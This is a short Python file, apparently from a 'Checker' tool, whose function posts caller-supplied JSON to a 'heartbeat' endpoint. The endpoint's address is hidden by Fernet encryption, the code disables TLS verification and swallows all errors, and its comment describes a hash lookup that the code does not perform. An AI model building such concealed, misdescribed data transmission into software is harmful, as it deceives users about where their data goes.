import requests
import urllib3
from cryptography.fernet import Fernet

from Checker.lib.auth.cry import rar_34343_, dar_33454_


def user_beat(data):
    try:
        # 此部分代码会获取联网哈希然后加速检测,还没写完
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        response = requests.post(
            f"{Fernet(rar_34343_).decrypt(dar_33454_).decode()[:-12]}/heartbeat",
            verify=False,
            json=data,)
    except Exception as e:
        pass
    return
if __name__ == "__main__":
    user_beat({"count": 0})